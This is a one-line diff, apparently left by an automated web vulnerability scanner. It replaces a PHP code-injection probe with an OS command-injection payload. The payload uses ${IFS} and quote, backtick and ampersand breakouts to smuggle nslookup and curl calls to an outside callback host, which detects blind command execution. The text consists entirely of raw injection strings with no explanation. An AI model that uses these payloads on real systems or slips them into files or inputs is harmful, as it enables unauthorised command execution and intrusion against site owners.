@@ -1,1 +1,1 @@
-';print(md5(31337));$a='
+&(nslookup${IFS}-q${IFS}cname${IFS}hitttxskaeiqs41fe6.bxss.me||curl${IFS}hitttxskaeiqs41fe6.bxss.me)&'\"`0&(nslookup${IFS}-q${IFS}cname${IFS}hitttxskaeiqs41fe6.bxss.me||curl${IFS}hitttxskaeiqs41fe6.bxss.me)&`'
